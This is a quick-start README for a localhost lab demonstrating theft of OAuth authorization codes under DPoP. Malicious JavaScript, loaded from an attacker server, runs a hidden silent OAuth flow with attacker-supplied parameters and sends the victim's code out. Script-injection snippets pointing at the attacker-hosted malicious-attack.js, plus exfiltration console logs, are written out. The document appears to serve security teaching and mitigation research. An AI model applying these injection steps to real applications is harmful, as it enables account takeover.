# Quick Start - Portable OAuth DPoP Attack

## 5-Minute Demo

### Prerequisites

1. Start all services:
   ```bash
   ./start-all.sh
   ```

   This starts:
   - IdentityServerHost (port 5001) - Authorization Server
   - WebClient (port 5010) - Example OAuth client
   - Api (port 5005) - Protected API
   - AttackerApi (port 7666) - Attack coordination server

### Running the Attack

#### Step 1: Open AttackerApi UI

Open https://localhost:7666 in your browser (let's call this **Tab A - Attacker**)

You'll see:
- A session ID (automatically generated)
- Instructions for the attack
- Input field for the authorize URL

#### Step 2: Start OAuth Flow in Target App

Open https://localhost:5010 in a **new tab** (let's call this **Tab B - Target App**)

1. Click "Secure" in the navigation menu
2. You'll be redirected to the login page
3. **STOP** - Don't log in yet!
4. Look at the browser address bar - you should see a URL like:
   ```
   https://localhost:5001/connect/authorize?client_id=dpop&redirect_uri=...&dpop_jkt=...&code_challenge=...&nonce=...
   ```
5. **Copy the entire URL**

#### Step 3: Extract Parameters

Go back to **Tab A - Attacker**

1. Paste the copied URL into the text area
2. Click **"Extract Parameters & Start Attack"**
3. Review the extracted parameters (dpop_jkt, code_challenge, nonce, etc.)
4. Click **"Submit to Victim"**

The UI will now show "Waiting for Stolen Code..."

#### Step 4: Victim Authenticates

Go back to **Tab B - Target App** (still on the login page)

1. Log in with any credentials (e.g., alice/alice)
2. After login, you'll be redirected to https://localhost:5010/Home/Secure
3. **This page has the malicious JavaScript!**

Watch the browser console (F12 → Console):
```
[MALICIOUS JS] Malicious script loaded. Polling for dpop_jkt...
[VICTIM] Received DPoP data: {...}
[MALICIOUS JS] Found dpop_jkt from attacker! Session: attack_...
[MALICIOUS JS] Starting silent OAuth flow with stolen dpop_jkt and code_challenge...
[MALICIOUS JS] Hidden iframe created with authorize URL
[MALICIOUS JS] ✅ Intercepted authorization code: ...
[MALICIOUS JS] ✅ Successfully sent authorization code to attacker!
```

#### Step 5: Complete the Attack

Go back to **Tab A - Attacker**

The UI should now show:
- ✅ Authorization code received!
- A pre-filled callback URL

Click **"Complete Flow in New Tab"**

A new tab opens (**Tab C - Attacker's Session**) and completes the OAuth flow:
- The stolen authorization code is used
- The attacker's code_verifier (matching the code_challenge) is used
- The attacker's DPoP key (matching the dpop_jkt) is used
- **The attacker is now logged in as Alice!**

### What Just Happened?

1. **Attacker** started an OAuth flow and captured their own DPoP parameters
2. **Victim** (Alice) logged in on a page with malicious JavaScript
3. **Malicious JS** performed a silent OAuth flow using the attacker's parameters
4. **Victim's authorization code** was intercepted and sent to the attacker
5. **Attacker** completed the OAuth flow with the stolen code
6. **Result**: Attacker has access to Alice's account!

## Testing Against Other Applications

### Option 1: Use the Example WebClient

The WebClient at https://localhost:5010/Home/Secure already has the malicious script loaded.

### Option 2: Inject into Your Own App

Add this to any page in your OAuth client application:

```html
<script src="https://localhost:7666/malicious-attack.js"></script>
```

Then follow the same steps above, but use your app's URL instead of localhost:5010.

### Option 3: Use Browser DevTools

If you can't modify the target app, inject the script via browser console:

```javascript
const script = document.createElement('script');
script.src = 'https://localhost:7666/malicious-attack.js';
document.head.appendChild(script);
```

## Troubleshooting

### "dpop_jkt not found in URL"

- Make sure the target application is configured to use DPoP
- Check that you copied the full authorize URL (not just part of it)
- The URL should contain `dpop_jkt=...`

### "No stolen code available yet"

- Make sure the victim page has the malicious JavaScript loaded
- Check the browser console for errors
- Verify the victim is authenticated (logged in)
- Try refreshing the victim page

### "Cross-origin access blocked"

- This is expected and normal during the attack
- The malicious script handles cross-origin restrictions
- As long as you see "✅ Intercepted authorization code", it's working

### "Authorization code expired"

- The code has a short lifetime (usually 30-60 seconds)
- Complete the attack faster
- Or increase the code lifetime in IdentityServerHost configuration

## Key Files

- **AttackerApi/wwwroot/index.html** - Attacker UI
- **AttackerApi/wwwroot/malicious-attack.js** - Victim-side malicious script
- **WebClient/Views/Home/Secure.cshtml** - Example victim page
- **WebClient/wwwroot/js/malicious-attack.js** - WebClient-specific version

## Next Steps

- Read `PORTABLE_ATTACK_GUIDE.md` for detailed explanation
- Read `PAR_ATTACK_ANALYSIS.md` to understand why PAR doesn't prevent this
- Experiment with different OAuth clients
- Try implementing mitigations (CSP, SRI, etc.)

## Important Notes

⚠️ **This is for educational purposes only!**

- Only test applications you own or have permission to test
- The attack requires JavaScript compromise (hardest part)
- Real-world attacks would need to inject the malicious script via XSS or supply chain attack
- This demonstrates why JavaScript security is critical for OAuth security
